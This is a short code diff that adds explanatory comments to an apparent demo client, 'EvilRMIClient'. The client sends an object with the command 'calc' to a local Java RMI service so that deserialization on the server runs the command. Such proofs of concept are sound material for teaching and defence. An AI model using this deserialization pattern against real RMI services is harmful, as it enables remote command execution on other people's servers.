@@ -12,10 +12,16 @@ public class EvilRMIClient {
     public void callRemote(String name) throws RemoteException, NotBoundException {
         Registry registry = LocateRegistry.getRegistry("127.0.0.1", 9099);
         RemoteService rs = (RemoteService) registry.lookup(name);
-
+        /**
+         * Suppose the server has a exploitable Class with a readObject() method
+         * and the param is controlled.
+         */ 
         Exploitable poc = new Exploitable();
         poc.setParam("calc");
-        
+        /**
+         * When we call remote method, the remote server will try to deserialize the Exploitable object
+         * and the readObject() was called, leading the command to be executed.
+         */
         rs.doSome(poc);
     }
 
